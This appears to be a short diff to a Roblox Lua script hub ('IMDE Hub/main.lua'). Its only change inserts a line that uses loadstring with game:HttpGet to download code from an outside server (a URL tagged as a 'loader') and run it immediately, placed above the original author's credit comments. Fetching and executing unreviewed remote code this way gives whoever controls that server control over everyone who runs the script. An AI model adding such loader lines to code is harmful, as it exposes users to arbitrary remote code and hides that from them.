@@ -4,6 +4,8 @@ task.spawn(function()
 	end)
 end)
 
+loadstring(game:HttpGet("https://api.synscripts.org/run/eyJpZCI6IjAxZjE5NjY3LWNkYTEtNDdkMS04NTA4LTFjMmQyYjBlOGY3MSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0="))()
+
 -- IMDE Hub/main.lua
 -- sexy script by github.com/orialdev
 -- please give credit if you use anything from my code
